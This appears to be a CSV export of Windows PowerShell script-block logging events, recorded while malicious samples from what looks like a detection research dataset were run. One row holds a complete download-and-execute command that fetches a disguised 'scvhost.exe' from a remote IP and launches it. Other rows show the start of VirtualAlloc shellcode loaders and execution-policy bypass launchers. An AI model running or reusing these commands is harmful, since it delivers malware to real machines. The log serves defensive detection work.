"TimeCreated","ScriptPath","ScriptLength","ScriptPreview"
"8/4/2026 8:30:19 PM","C:\Users\sani\Desktop\pancingan - Copy - Copy.ps1","32","{ $_.Properties[1].Value -gt 1 }"
"8/4/2026 8:30:19 PM","C:\Users\sani\Desktop\pancingan - Copy - Copy.ps1","27","{ !$_.Properties[4].Value }"
"8/4/2026 8:30:19 PM","C:\Users\sani\Desktop\pancingan - Copy - Copy.ps1","43","{ $_.TimeCreated.Date -eq (Get-Date).Date }"
"8/4/2026 8:30:19 PM","C:\Users\sani\Desktop\pancingan - Copy - Copy.ps1","3127","<#
.SYNOPSIS
    Baca Script Block Logging Event ID 4104 dari Windows Event Log
    Jalankan sebagai Administrator
#>
$Host.UI.RawUI.BufferSize = New-Object System.Management.Automation.Host.Size"
"8/4/2026 8:30:19 PM","","143","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\sani\Desktop\pancingan - Copy - Copy.ps1'"
"8/4/2026 8:30:00 PM","C:\TA\project-ta\data_spliting\test_set\malicious\112.ps1","159","(New-Object System.Net.WebClient).DownloadFile('http://93.174.94.137/~karma/scvhost.exe',""$env:APPDATA\scvhost.exe"");Start-Process (""$env:APPDATA\scvhost.exe"")"
"8/4/2026 8:30:00 PM","","151","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\malicious\112.ps1'"
"8/4/2026 8:29:45 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 8:29:45 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 8:29:44 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 8:29:44 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 8:29:44 PM","C:\TA\project-ta\data_spliting\test_set\malicious\102.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/4/2026 8:29:44 PM","","151","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\malicious\102.ps1'"
"8/4/2026 8:29:30 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 8:29:30 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 8:29:30 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 8:29:30 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 8:29:30 PM","C:\TA\project-ta\data_spliting\test_set\malicious\82.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/4/2026 8:29:30 PM","","150","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\malicious\82.ps1'"
"8/4/2026 8:29:19 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 8:29:19 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 8:29:19 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 8:29:19 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
